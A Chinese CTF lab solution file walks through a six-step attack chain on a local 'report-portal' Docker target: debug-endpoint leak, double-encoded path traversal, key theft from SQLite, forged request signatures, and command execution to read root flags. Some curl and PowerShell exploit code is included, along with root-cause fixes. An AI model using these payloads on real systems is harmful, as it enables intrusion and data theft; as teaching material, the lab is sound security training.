# 解题步骤（含完整答案）

> ## ⚠️ 本文件包含完整答案，请谨慎阅读
>
> **建议的使用顺序**：
> 1. 先自己动手做，卡住了看 `HINT.md`（只给方向，不给答案）
> 2. **做完之后**再回来对照本文件 —— 收获最大
> 3. 直接照抄本文件 = 背答案，学不到方法
>
> 下面每一关都已经**折叠**（点击展开），不会"不小心"看到答案。
>
> 另外：本文件**不提供自动化利用脚本** —— 每一步的关键判断都留给做题的人，
> 只把「机械劳动」（算哈希、发 HTTP、解析数据库）包装成了 `tools/` 下的小工具。

---

## 目录

- [配套小工具](#配套小工具)
- [前置条件](#前置条件)
- [第 ① 步 · 侦察](#第--步--侦察)
- [第 ② 步 · 未授权信息泄露](#第--步--未授权信息泄露)
- [第 ③ 步 · 路径遍历（双重编码绕过）](#第--步--路径遍历双重编码绕过)
- [第 ④ 步 · 从数据文件里读出内部约定](#第--步--从数据文件里读出内部约定)
- [第 ⑤ 步 · 伪造签名，改掉持久化字段](#第--步--伪造签名改掉持久化字段)
- [第 ⑥ 步 · 触发执行](#第--步--触发执行)
- [完整链路回顾](#完整链路回顾)
- [常见卡点（详细版）](#常见卡点详细版)
- [附一 · Windows PowerShell 等价写法](#附一--windows-powershell-等价写法)
- [附二 · 恢复现场（必做）](#附二--恢复现场必做)
- [附三 · 清理环境](#附三--清理环境)

---

## 配套小工具

`tools/` 目录里有两个脚本，把重复劳动打包好了，**学员只需要改一行**。

### `tools/看库.py` —— 查看数据文件

1. 打开文件，把 `DB = r"..."` 改成交付给他的数据文件路径
2. 执行：`python 看库.py`

它会一次列出**所有表、所有字段、所有数据**，并提示"哪些字段名像诱饵"。

### `tools/执行表达式.py` —— 改字段 + 触发执行

1. 打开文件，把 `KEY` 换成他从数据文件里读到的 `internal_sign_key`
2. 把 `EXPR` 改成想让系统求值的表达式
3. 执行：`python 执行表达式.py`

它会自动完成「用 config 签名改字段 → 用 execute 签名触发 → 打印结果」这一套动作。

### ⚠️ 为什么**没有**第 ③ 步（路径遍历）的脚本

因为第 ③ 步的**全部价值就在于"自己发现绕过方法"**：

- 脚本只能替他打键盘，**不能替他理解"检查和解码的顺序错了"**
- 一旦给了自动脚本，这一关就退化成"抄一个 payload"，学不到东西

**规律：机械劳动给脚本，发现与判断留给人。**

---

## 前置条件

| 项 | 值 |
|---|---|
| 靶场地址 | `http://127.0.0.1:18081`（按实际映射的宿主端口） |
| 账号 | **不需要**。系统没有任何可用的默认账号 |
| 工具 | 浏览器（F12）+ Python 3 |

启动方式（在靶场源码目录）：

```bash
docker build -t report-portal-lab .
docker run -d --name report-portal-lab -p 127.0.0.1:18081:8080 report-portal-lab
```

**目标**：找出两个 `FLAG{...}`

- 一个在**应用层**可达的位置（靠前面的步骤就能拿到）
- 一个在**容器高权限目录**（必须走完整条链）

---

## 第 ① 步 · 侦察

<details>
<summary><b>▶ 点击展开：第 ① 步 · 侦察 的完整步骤</b></summary>


### 目标

找出页面上**不该被外部看到**的信息。

### 怎么做

打开 `http://127.0.0.1:18081`，按 `Ctrl+U` 看**页面源码**（不是看页面渲染出来的样子）。

### 应该看到什么

页面底部有一段 HTML 注释：

```html
<!--
  TODO(运维) 上线前处理：
    1. /debug/env 是部署期临时加的排查入口，正式环境记得关掉；
    2. data 目录不要再往里塞临时导出文件；
    3. /internal/report/execute 的调用方只有调度器，不要对外暴露。
-->
```

### 情报拆解

| 待办 | 泄露了什么 | 价值 |
|---|---|---|
| `/debug/env 是部署期临时加的` | 存在调试端点，而且「上线前记得关掉」= **现在开着** | 🔴 入口 |
| `data 目录里有导出文件` | 有个 `data` 目录，里面可能有文件能被下载 | 🔴 数据 |
| `/internal/report/execute 的调用方只有调度器` | 存在**内部接口**，设计上不该对外 | 🔴 后续入口 |

### 为什么这一步重要

真实项目里，这类线索长这样：

```
// TODO: remove before release
<!-- 测试环境地址: 10.x.x.x -->
# 临时开放，上线改成 false
```

**看到「临时 / 暂时 / 上线前 / 待处理 / 不要对外」这类词，就等于看到一条线索。**

> 常见泄露源：HTML 注释、前端 JS 里的接口地址、`.git` 目录、备份文件、
> 错误页堆栈、`robots.txt`、`sitemap.xml`、调试/健康检查端点。

---

</details>

## 第 ② 步 · 未授权信息泄露

<details>
<summary><b>▶ 点击展开：第 ② 步 · 未授权信息泄露 的完整步骤</b></summary>


### 目标

访问第 ① 步发现的调试端点，判断它的价值。

### 怎么做

浏览器直接打开 `http://127.0.0.1:18081/debug/env`，
或用 curl / HackBar / 控制台 `fetch`。

### 应该看到什么

**不需要任何登录**就能拿到：

```json
{
  "app": "report-portal",
  "app_home": "/app",
  "data_dir": "data",
  "database": "data/report.db",
  "debug": true,
  "internal_api": "/internal/report/execute",
  "internal_auth": "内部接口需携带请求头 X-Internal-Sign",
  "internal_config_api": "/api/report/config/save",
  "note": "内部签名规则随系统配置一起存放，请勿外传",
  "temp_dir": "templates/",
  "version": "1.4.2"
}
```

### 字段价值分级（本节核心技能）

拿到一坨 JSON 时，**不要"读内容"，要问"这个字段能让我多控制什么"**：

| 字段 | 归类 | 价值 | 拿到之后干什么 |
|---|---|---|---|
| `database = data/report.db` | **文件路径** | 🔴 高 | 想办法下载这个文件 |
| `internal_api = /internal/report/execute` | **接口名** | 🔴 高 | 后面调用它 |
| `internal_config_api = /api/report/config/save` | **接口名** | 🔴 高 | 后面调用它 |
| `internal_auth = 需携带 X-Internal-Sign` | **鉴权规则** | 🟠 极高 | 知道认证机制的名字 |
| `note = 签名规则随系统配置一起存放` | **提示** | 🟠 **极高** | **它告诉你钥匙藏在数据库里** |
| `temp_dir = templates/` | 路径 | 🟡 中 | 报表缓存目录 |
| `app_home = /app` | 路径 | ⚪ 低 | 确认应用根目录 |
| `debug = true` | 状态 | ⚪ 低 | 确认这是非生产模式 |
| `app` / `version` | 名字 / 版本 | ⚪ 低 | 只用于确认身份 |

### 两个关键区分

**①「文件路径」vs「接口名」—— 动作完全不同**

```
data/report.db               带扩展名 / 指向文件  → 动作：去"读文件"
/internal/report/execute     以 / 开头、像 URL    → 动作：去"调接口"
```

判断方法：带扩展名（`.db` `.log` `.zip`）或指向目录的 → 文件路径；
以 `/` 开头、名字里带动词（execute / save / list）→ 接口。

**②「说明类」字段，别只看它是什么，要看它说了什么**

`note` 表面是"一句废话"，实际是**钥匙位置的线索**：

> 「签名规则随系统配置一起存放」→ 也就是说，**规则就存在数据库里**。

**这是整份 JSON 里最值钱的一条。**

---

</details>

## 第 ③ 步 · 路径遍历（双重编码绕过）

<details>
<summary><b>▶ 点击展开：第 ③ 步 · 路径遍历（双重编码绕过） 的完整步骤</b></summary>


### 目标

把 `data/report.db` 这个文件下载到本地。

### 3.1 · 先找"读文件"的入口

回首页看源码，底部有一段 JS：

```html
<select id="reportSelect">...</select>
<button onclick="previewReport()">预览</button>

<script>
function previewReport() {
  var name = document.getElementById('reportSelect').value;
  var file = name + '.db';          // 导出文件与报表同名
  window.location.href = '/report/preview?name=' + encodeURIComponent(file);
}
</script>
```

**情报**：

| 信息 | 值 |
|---|---|
| 接口 | `/report/preview` |
| 参数名 | **`name`** |
| 参数值 | 一个**文件名**（如 `sales_summary.db`） |

> **技能点**：现代 Web 应用的后端接口 100% 被前端 JS 调用，
> 所以**前端代码里必然写着接口地址、参数名、参数格式、认证头**。
> 找参数名的最快办法不是猜，是**读 JS**。

### 3.2 · 建立正常基线

先在页面上点一次「预览」，观察：

```
请求   : GET /report/preview?name=sales_summary.db
状态码 : 200
响应头 : Content-Disposition: attachment; filename="sales_summary.db"
响应体 : 一个 12288 字节的 SQLite 文件
```

**判读**：这个接口在**读文件**（返回二进制 + 有下载头），
参数值是文件名 → **服务端一定在某个目录里按这个名字找文件**。

### 3.3 · 撞墙，看它怎么拦你

把参数改成目标路径：

```
http://127.0.0.1:18081/report/preview?name=../data/report.db
```

**实际响应**：

```
HTTP/1.1 400 BAD REQUEST
{"msg": "文件名不合法", "success": false}
```

### 3.4 · 读这句话（本节核心）

「文件名不合法」告诉了我们三件事：

| 信息 | 推论 |
|---|---|
| 检查的是「**文件名**」 | 它是**基于字符串内容**判断的，不是基于真实路径 |
| 报的是「不合法」而非「不存在」 | 检查发生在**打开文件之前** |
| 它认为这个名字不合法 | 说明有个**黑名单特征**在匹配 —— 最可能是 `../` |

**于是问题变了个形**：

> 原来：「我要读 `../data/report.db`」
> 现在：「**我要表达出这个路径，但不让 `../` 这三个字符出现**」

### 3.5 · 第一次尝试：单层编码

URL 编码表（**记住这三个**）：

| 字符 | 编码 |
|---|---|
| `.` | `%2e` |
| `/` | `%2f` |
| `%` | `%25` |

试试把 `/` 编码：

```
http://127.0.0.1:18081/report/preview?name=..%2fdata%2freport.db
```

**结果：仍然 400。**

### 3.6 · 这个 400 告诉你的关键信息

参数在**到达应用代码之前**，就已经被人**解码过一次**了。

那个人就是 **Web 框架** —— 它收到请求时会自动把 query string 里的 `%XX` 还原
（框架认为 URL 解码是传输层的事）。

于是顺序变成：

```
你发 %2f  →  框架解码成 /  →  应用检查，看到完整的 ../  →  拦
```

### 3.7 · 绕过：多编一层

**思路**：让「被解码一次之后的样子」仍然不含 `../`。

```
目标路径：  ../data/report.db

第 1 层：把 / 编码        →   ..%2fdata%2freport.db
第 2 层：把 % 再编码      →   ..%252fdata%252freport.db
                              （% 的编码是 %25，所以 %2f → %252f）
```

**完整请求**：

```
http://127.0.0.1:18081/report/preview?name=..%252fdata%252freport.db
```

等价写法（把 `.` 也编码）：`%252e%252e%252fdata%252freport.db`，**两种都可以**。

### 3.8 · 结果

```
HTTP/1.1 200
Content-Length: 36864
Content-Disposition: attachment; filename="report.db"
```

**拿到了数据文件。** 保存为 `report.db`。

### 3.9 · 边界验证（说明影响面被收窄）

```bash
# 越界读系统文件
curl -o /dev/null -w "%{http_code}\n" \
  "http://127.0.0.1:18081/report/preview?name=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
# → 403   仅允许预览应用目录内的数据文件

# 非 .db 后缀
curl -o /dev/null -w "%{http_code}\n" \
  "http://127.0.0.1:18081/report/preview?name=%252e%252e%252fapp.py"
# → 403   仅允许预览报表数据文件（.db）
```

### 3.10 · 根因与正确修复

**有问题的代码逻辑**：

```python
raw = request.args.get("name")   # 框架已自动解码过一次
if "../" in raw:                 # ← 问题1：用"字符串特征"做黑名单
    return 400
filename = unquote(raw)          # ← 问题2：检查之后又解码一次
open(filename)                   # ← 问题3：检查的资源 ≠ 使用的资源
```

**三个问题叠在一起**：

| # | 问题 | 后果 |
|---|---|---|
| 1 | 用黑名单字符串判断，而不是判断真实路径 | 写出"等价但不含该串"的形式即绕过 |
| 2 | 检查之后又解码一次 | 编码被还原，检查白做 |
| 3 | 检查的是"名字"，用的是"路径" | 两者可以不一致 |

**正确做法**：

```python
target = os.path.realpath(os.path.join(BASE_DIR, filename))     # 先规范化
if not target.startswith(os.path.realpath(BASE_DIR) + os.sep):  # 再判断边界
    return 403
```

`realpath` 会把 `../`、`%2e`、符号链接统统解析成最终真实路径，
判断的是「**这个真实路径有没有跑出允许的目录**」—— 无论怎么编码都躲不掉。

> 本靶场里真正兜底的是"只允许读应用目录内的 `.db` 文件"，所以影响面被收窄了。
> **这就是"漏洞存在，但影响受限"的典型样子** —— 评估危害时要看清边界。

---

</details>

## 第 ④ 步 · 从数据文件里读出内部约定

<details>
<summary><b>▶ 点击展开：第 ④ 步 · 从数据文件里读出内部约定 的完整步骤</b></summary>


### 目标

把数据库当"系统说明书"读，找出下一步要用的东西。

### 怎么做

**方式 A（推荐）**：用 `tools/看库.py`，改一行路径后执行：

```bash
python 看库.py
```

**方式 B**：用 DB Browser for SQLite 之类的图形工具打开。

### 应该看到什么

**表清单**：`report_def`、`sys_config`、`sys_user`、`sys_log`

#### `sys_config` 表（关键）

| key | value | 判读 |
|---|---|---|
| `internal_sign_key` | `513db3b7…` | 🔴 **签名密钥** —— 后面全靠它 |
| `internal_sign_rule` | `sha256("{action}\|{name}\|{value}\|{key}")，action 取值 config / execute` | 🔴 **签名算法** |
| `internal_api_path` | `/internal/report/execute` | 内部执行接口 |
| `internal_config_api` | `/api/report/config/save` | 内部配置接口 |
| `db_relative_path` | `data/report.db` | 数据文件位置 |
| `export_temp_dir` | `templates/` | 报表导出缓存目录 |
| `user_flag` | `FLAG{user_level_…}` | ✅ **用户层验证值** |
| `legacy_flag_sample` | `FLAG{this_is_a_decoy_not_the_real_one}` | ⚪ **诱饵** |
| `root_flag_path_decoy` | `/tmp/flag.txt` | ⚪ **诱饵路径** |

#### `report_def` 表

| name | preview_expr（初始值） |
|---|---|
| `sales_summary` | `report_total("sales_summary")` |
| `inventory_snapshot` | `report_total("inventory_snapshot")` |
| `finance_monthly` | `report_total("finance_monthly")` |
| `ops_health` | `report_total("ops_health")` |

→ 每条报表都有一个**可维护的表达式字段** `preview_expr`，后端执行报表时会读取它。

#### `sys_log` 表

含若干条日志与**诱饵线索**（如"备份文件未上传""root 相关文件位于独立目录"），
用于训练"**信息筛选**"能力 —— **不是每条日志都有用**。

### 识别诱饵的三个信号

| 信号 | 例子 |
|---|---|
| 字段名带 `decoy` / `legacy` / `sample` / `fake` / `test` / `deprecated` | `legacy_flag_sample`、`root_flag_path_decoy` |
| 内容自己承认是假的 | `this_is_a_decoy_not_the_real_one` |
| 真值通常伴随"用途说明" | `user_flag` 的 note 写着"取得数据文件即可见" |

> 真实渗透里这叫 **honeytoken（蜜标）**：故意放个看着像目标的东西，谁碰谁暴露。
> **拿到"flag / 密码 / token"时，先说一句"这不会是诱饵吧"，再往下走。**

### 本步产出（情报清单）

| 情报 | 状态 |
|---|---|
| 数据文件内容 | ✅ |
| 用户层验证值 | ✅ |
| 签名**密钥** | ✅ |
| 签名**规则** | ✅ |
| 两个内部接口地址 | ✅（第②步） |
| 调用要带的请求头名 `X-Internal-Sign` | ✅（第②步） |
| 高权限层验证值 | ❌ **还没有** |

---

</details>

## 第 ⑤ 步 · 伪造签名，改掉持久化字段

<details>
<summary><b>▶ 点击展开：第 ⑤ 步 · 伪造签名，改掉持久化字段 的完整步骤</b></summary>


### 目标

用泄露的密钥**造出一个合法签名**，从而以"内部服务"的身份调用接口，
把 `ops_health` 的 `preview_expr` 改成自己想要的表达式。

### 5.1 · 把规则读成人话

```
sha256("{action}|{name}|{value}|{key}")，action 取值 config / execute
```

| 要素 | 含义 |
|---|---|
| `sha256(...)` | 算法：SHA256 |
| `\|` | 分隔符：四段之间用**半角竖线**连接 |
| `{action}` | `config`（改配置）或 `execute`（触发执行） |
| `{name}` | 报表名，如 `ops_health` |
| `{value}` | 本次操作的值 |
| `{key}` | 数据文件里的 `internal_sign_key` |

**翻译成人话**：

> 把「动作、报表名、值、密钥」四段，按这个顺序、用竖线连成一个字符串，
> 对它做 SHA256，得到的十六进制串就是签名。
> **差一个字符都不行** —— 顺序、分隔符、空格都会导致签名错误。

### 5.2 · 为什么这个"鉴权"等于没有

| 设计者的假设 | 实际情况 |
|---|---|
| 密钥只有内部服务知道 | **密钥就存在数据库里** |
| 数据库是内部资产 | **数据库被下载下来了** |
| 算法是内部约定 | **算法也写在同一个数据库里** |

> **锁、钥匙、说明书全放在同一个盒子里，而盒子被端走了。**

这是安全设计的经典反模式：**把"认证凭据"和"被保护的资源"放在同一个信任边界内。**

### 5.3 · 实验：先验证签名能被接受

用 `tools/执行表达式.py`：把 `KEY` 换成库里的密钥，`EXPR` **先设成无害值**：

```python
EXPR = '12345'
```

执行后应该看到：

```
[1] 修改配置 : 200 {"affected":1,"msg":"报表配置已更新","success":true}
[2] 执行结果 : 200 {"expression":"12345","report":"ops_health","result":12345,"success":true}
```

> **先验证"签名能否被接受"，再追求危害。** 分两步走，出问题时好定位。

### 5.4 · 对照组实验

再手动做一次**不带签名**的请求：

```bash
curl -s -X POST http://127.0.0.1:18081/api/report/config/save \
  -H "Content-Type: application/json" -d '{"name":"ops_health","value":"x"}'
# → 403  {"msg":"内部签名校验失败","success":false}
```

| 实验 | 结果 |
|---|---|
| 不带签名 | **403** |
| 带伪造签名 | **200** |

**两者放在一起，才能证明"是签名起的作用"** —— 否则万一是接口本来就谁都能调呢？

> **渗透的硬规矩**：任何"我利用成功了"的结论，都必须配一个"拿掉这一步就不行"的对照。
> 这是写报告的基本功，**没有对照组的成功，审核一句"会不会本来就能调"就顶回来了。**

---

</details>

## 第 ⑥ 步 · 触发执行

<details>
<summary><b>▶ 点击展开：第 ⑥ 步 · 触发执行 的完整步骤</b></summary>


### 目标

让系统**读取并执行**那个被我们控制了的字段。

### 6.1 · 先打通执行接口

接口：`POST /internal/report/execute`，body `{"name":"ops_health"}`

**签名要用 `execute` 这个 action**，规则长这样：

```
sha256("execute|ops_health|{value}|{key}")
```

**问题来了**：`config` 的时候 `value` 是"新表达式"，很好填；
但 `execute` 这个动作**本身没有"值"这个概念**，`{value}` 该填什么？

**规则文档没写。** 这就是真实工作里天天遇到的情况：

> **文档没说清 → 做实验。**

最自然的猜测是**空字符串**（注意那两个连着出现的竖线）：

```
execute|ops_health||你的密钥
```

如果 403，就换别的猜法再试。**试错是渗透的日常。**

### 6.2 · 观察结果

`tools/执行表达式.py` 会同时完成「改字段」和「触发」两步，输出：

```
[1] 修改配置 : 200 {...}
[2] 执行结果 : 200 {"expression":"12345","report":"ops_health","result":12345,"success":true}
                                        ↑ 你写的      ↑ 系统执行并返回了
```

**"你写什么，它就执行什么" —— 因果关系被证实了。**

### 6.3 · 找到危险函数

打开靶场的帮助文档：`http://127.0.0.1:18081/help/expression`

```
report_total(name)   返回指定报表的汇总结果（正常业务表达式使用）
run(cmd)             在服务器上执行命令并返回输出结果
read_file(path)      读取文件内容并返回
通用函数：len str int float bool list dict min max sum abs round

结果目录（表达式仅可读取以下目录内的文件）：/flag  /root
```

> **技能点**：真实渗透里，当你发现"某个字段会被求值"时，
> 下一步就是**去翻厂商文档**看这个环境支持什么语法、有什么限制。
> 很多人卡住不是因为技术不够，是**没去读文档**。

### 6.4 · 先探路，再取目标

**不要一上来就读文件**，先看目录里有什么：

```python
EXPR = 'run("ls /flag")'
```

```
result: "note.txt\ntemp_check.txt\n"
```

```python
EXPR = 'run("ls /root")'
```

```
result: "root_flag.txt\n"
```

### 6.5 · 逐个验证，判断真假

```python
EXPR = 'run("cat /flag/temp_check.txt")'
```

```
result: "FLAG{this_is_a_decoy_not_the_real_one}"     ← 诱饵
```

```python
EXPR = 'run("cat /flag/note.txt")'
```

```
result: "本目录为系统保留目录…请勿在此目录中寻找与业务无关的内容。"
```

```python
EXPR = 'run("cat /root/root_flag.txt")'
```

```
result: "FLAG{root_level_...}"                       ← ★ 真正的目标
```

**等价写法（不懂 Linux 命令时更省事）**：

```python
EXPR = 'read_file("/root/root_flag.txt")'
```

### 6.6 · 表达式语法小抄

| 目的 | 写法 |
|---|---|
| 列目录 | `run("ls /root")` |
| 读文件（Linux 命令式） | `run("cat /root/root_flag.txt")` |
| 读文件（函数式） | `read_file("/root/root_flag.txt")` |
| 看身份 | `run("id")` |
| 正常业务表达式 | `report_total("ops_health")` |

**引号注意**（新手最常栽）：

```python
EXPR = 'run("cat /root/root_flag.txt")'
#      ↑                            ↑  外层单引号是 Python 的，不会发出去
#        ↑                        ↑    内层双引号是"表达式"的一部分，会被发给服务器
```

写成 `EXPR = "run("cat ...")"` 会直接 Python 语法报错。

### 6.7 · 沙盒边界（本靶场的教学约束）

| 表达式 | 结果 |
|---|---|
| `read_file("/etc/passwd")` | 沙盒已阻止访问该路径 |
| `run("cat /etc/passwd")` | 沙盒已阻止访问该路径 |
| `run("rm -rf /")` | 沙盒已阻止该命令 |
| `__import__("os").system("id")` | 表达式包含不被允许的语法 |
| `().__class__.__bases__[0].__subclasses__()` | 表达式包含不被允许的语法 |

**沙盒的实现**：

1. **命令白名单**：只放行 `cat / head / ls / id / whoami`
2. **路径白名单**：只能落在 `/flag`、`/root`（两侧都做 `realpath` 规范化，防符号链接绕过）
3. **AST 语法白名单**：禁止属性访问、下划线名称、导入等

> **为什么要加沙盒**：让这个靶场可以安全地在本地反复练习。
> **真实环境里没有这层沙盒** —— 所以"字段可写"这一个前置条件才如此危险。

---

</details>

## 完整链路回顾

<details>
<summary><b>▶ 点击展开：完整链路回顾</b>（含剧透，建议做完再看）</summary>


```
① 侦察 ────────► 看页面源码注释 → 才知道有 /debug/env
                                    ↓
② 未授权泄露 ──► 访问 /debug/env → 才知道有 data/report.db、
                                    两个内部接口、要带 X-Internal-Sign
                                    ↓
③ 路径遍历 ────► 双重编码绕过过滤 → 才拿到 report.db
                                    ↓
④ 读数据文件 ──► 才拿到 internal_sign_key + 签名规则 + 用户层 flag
                                    ↓
⑤ 伪造签名 ────► 改掉 preview_expr 字段 → 才拥有"可控的业务输入"
                                    ↓
⑥ 触发执行 ────► 字段被送进求值 → 命令执行 → 拿到高权限 flag
```

### 依赖关系（为什么不能跳步）

| 跳过哪一步 | 会怎样 |
|---|---|
| 跳过 ① | 不知道有 `/debug/env`，无从下手 |
| 跳过 ② | 不知道数据文件位置、不知道要带签名 |
| 跳过 ③ | 拿不到数据文件 |
| 跳过 ④ | 没有密钥和规则 → 所有内部接口永远 **403** |
| 跳过 ⑤ | 执行接口返回的是正常业务表达式，**毫无危害** |
| 跳过 ⑥ | 改完字段只是数据库里多了一行数据，没有任何执行 |

### 核心结论

> **单个缺陷看起来都不致命，串起来就是完整控制权。**
>
> 这条链的**枢纽**只有一句话：
> **一个"能被外部写入"的字段，被送进了"能力过强的求值引擎"。**
>
> 前面 4 步都是在为这句话做铺垫 —— **为了拿到"写"的权限。**

---

</details>

## 常见卡点（详细版）

<details>
<summary><b>▶ 点击展开：常见卡点（详细版）</b>（含剧透，建议做完再看）</summary>


### 卡点 1 · 用 `%2e%2e%2f` 绕不过路径过滤

**原因**：那只是**一次**编码。Web 框架收到请求时会先自动解码一次，
所以应用代码看到的仍然是明文 `../`，被黑名单拦住。

**对策**：**二次编码** —— 把 `%` 也编码成 `%25`：

```
%2f  →  %252f
```

### 卡点 2 · 内部接口一直返回 403

逐项核对：

| 检查项 | 容易错的地方 |
|---|---|
| 分隔符 | 必须是**半角** `\|`，不是全角 `｜` |
| 顺序 | `action \| name \| value \| key`，四段顺序不能变 |
| 空格 | 前后、中间**不能有多余空格** |
| `execute` 的 value | **空字符串**（两个竖线紧挨着） |
| `key` | 必须是数据文件里的值，不能自己编 |
| 签名与 body 一致 | 传给签名的 `value` 必须和请求体里的字符串**完全一致** |

### 卡点 3 · `Content-Type` 不对，服务器说"没收到参数"

**现象**：body 明明写了 `{"name":"..."}`，服务器返回"缺少参数 name"。

**原因**：请求头的 `Content-Type` 是 `application/x-www-form-urlencoded`，
服务器按**表单格式**解析你的 JSON → 解析失败 → 拿不到字段。

**对策**：改成 `application/json`。
用 HackBar 时注意它的 `enctype` 下拉有时不生效 —— 可以**在自定义头里手动加一条**覆盖掉。

> **这是 API 测试里最高频的坑之一。** 遇到"body 写了但服务器说没收到"，先查 Content-Type。

### 卡点 4 · 工具显示的和实际发出去的不一样

**对策**：`F12` → **Network** → 清空 → 重新发送 → 点开那条请求，
看**实际发出的** `Content-Type`、Payload、以及**状态码**。

> **铁律：UI 会骗你、框架会骗你、缓存会骗你，只有线路上跑的字节不会骗你。**

### 卡点 5 · `看库.py` 报 `no such table`，而不是"文件不存在"

**原因**：**SQLite 的坑** —— `sqlite3.connect()` 拿到一个不存在的路径时**不会报错**，
而是**静默创建一个空数据库**。所以路径写错时，你连的是一个空库。

**对策**，三件事依次确认：

| 检查 | 怎么做 |
|---|---|
| 文件存不存在 | `Get-Item 路径` |
| 文件多大 | 应该是 **36864 字节**左右 |
| 文件类型 | `Get-Content 文件 -TotalCount 1` → 应显示 `SQLite format 3` |

> **真实取证/应急里这个坑坑过很多人**：打开"备份文件"发现是空的，其实路径错了。

### 卡点 6 · 签名算错了

**对策**：**用一个已知答案校准你的工具。**

在 HackBar / 控制台 / Python 里对字符串 `abc` 做 SHA-256，正确结果是：

```
ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad
```

- **对上了** → 工具没问题，是你**拼字符串**错了
- **对不上** → 工具的用法不对（HackBar 有的版本要先选中文字；控制台要给 `crypto.subtle` 传 `Uint8Array`）

### 卡点 7 · `execute` 的 value 到底填什么？

规则里写了 `{value}`，但没说 `execute` 时填什么。

**答案**：**空字符串**。构造出来是 `execute|报表名||密钥`（两个竖线紧挨着）。

**方法**：文档没写清时，**做实验** —— 两种都试，看哪个能过 403。

---

</details>

## 附一 · Windows PowerShell 等价写法

<details>
<summary><b>▶ 点击展开：附一 · Windows PowerShell 等价写法</b>（含剧透，建议做完再看）</summary>


```powershell
# 1) 算签名
$KEY  = "把 internal_sign_key 粘到这里"
$EXPR = 'run("cat /root/root_flag.txt")'
$raw  = "config|ops_health|$EXPR|$KEY"
$SIG  = [BitConverter]::ToString(
          [Security.Cryptography.SHA256]::Create().ComputeHash(
            [Text.Encoding]::UTF8.GetBytes($raw))).Replace("-","").ToLower()

# 2) 改配置（JSON 写文件，避免引号被 shell 吃掉）
$body = Join-Path $env:TEMP "body.json"
'{"name":"ops_health","value":"run(\"cat /root/root_flag.txt\")"}' |
  Set-Content $body -Encoding ascii
curl.exe -s -X POST http://127.0.0.1:18081/api/report/config/save `
  -H "X-Internal-Sign: $SIG" -H "Content-Type: application/json" --data-binary "@$body"

# 3) 触发执行
$raw2 = "execute|ops_health||$KEY"
$SIG2 = [BitConverter]::ToString(
          [Security.Cryptography.SHA256]::Create().ComputeHash(
            [Text.Encoding]::UTF8.GetBytes($raw2))).Replace("-","").ToLower()
'{"name":"ops_health"}' | Set-Content $body -Encoding ascii
curl.exe -s -X POST http://127.0.0.1:18081/internal/report/execute `
  -H "X-Internal-Sign: $SIG2" -H "Content-Type: application/json" --data-binary "@$body"
```

> ⚠️ PowerShell 里 JSON 带双引号时**不要直接拼在 `-d` 后面**，
> 写进文件再用 `--data-binary "@文件"` 才不会被引号解析搞坏。

---

</details>

## 附二 · 恢复现场（必做）

**真实渗透有一条纪律，比技术更重要：你改过的数据，要改回去。**

本靶场里，你在第 ⑤ 步把 `ops_health` 的 `preview_expr` 改成了命令执行表达式。
**做完实验后必须改回正常业务表达式**：

```python
EXPR = 'report_total("ops_health")'
```

重跑 `tools/执行表达式.py`，确认返回的是正常业务结果，而不是命令输出。

**为什么必须做**：

- 真实项目里，改坏生产数据可能造成业务故障
- 这是白帽最容易被追责的点
- 你在漏洞平台规则里看到的「**测试完毕删除测试记录**」就是这条纪律

---

## 附三 · 清理环境

```bash
docker rm -f report-portal-lab
docker rmi report-portal-lab
```

重新开始一次（验证值和密钥会重新随机生成）：

```bash
docker run -d --name report-portal-lab -p 127.0.0.1:18081:8080 report-portal-lab
```

---

*本文件仅供教学。请在本地隔离环境中使用，遵守《中华人民共和国网络安全法》及相关法律法规。*
